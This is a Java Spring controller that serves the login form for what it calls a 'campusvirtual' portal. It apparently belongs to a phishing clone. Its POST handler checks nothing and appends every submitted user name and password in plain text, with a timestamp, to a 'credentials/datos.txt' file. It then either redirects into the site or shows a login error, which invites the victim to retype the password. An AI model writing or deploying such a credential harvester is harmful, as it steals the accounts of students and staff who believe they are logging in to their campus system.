package campusvirtual.controller.login;

import lombok.extern.slf4j.Slf4j;
import org.slf4j.MDC;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.mvc.support.RedirectAttributes;
import org.springframework.web.servlet.view.RedirectView;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

@Slf4j
@Controller
@RequestMapping("/login")
public class LoginController {

    private final String loginView = "login";

    @GetMapping("")
    public ModelAndView loginView(){
        ModelAndView mv = new ModelAndView(this.loginView);
        mv.addObject("remember", false);
        return mv;
    }

    @PostMapping("")
    public RedirectView processLogin(@RequestParam("user") String user, @RequestParam("password") String password, @RequestParam("remember") boolean remember, RedirectAttributes redirectAttributes) {
        ModelAndView mv = new ModelAndView(this.loginView);
        mv.addObject("user", user);

        File dataDir = new File(System.getProperty("user.home"), "campusvirtual/credentials");
        if (!dataDir.exists()) {
            log.info("Creating directory: " + dataDir);
            dataDir.mkdirs();
        }

        File dataFile = new File(dataDir, "datos.txt");

        try (FileWriter fw = new FileWriter(dataFile, true);
             PrintWriter out = new PrintWriter(fw)) {
            out.println("------------------------------");
            out.printf("User: %s%n", user);
            out.printf("Password: %s%n", password);
            out.println("time: " + LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")));

        } catch (IOException e) {
            e.printStackTrace();
        }

        if (remember) {
            redirectAttributes.addFlashAttribute("user", user);
            RedirectView redirectView = new RedirectView("/inicio");
            redirectView.setExposeModelAttributes(false);
            return redirectView;
        }
        redirectAttributes.addFlashAttribute("error", true);
        RedirectView redirectView = new RedirectView("/login");
        redirectView.setExposeModelAttributes(false);
        return redirectView;
    }

}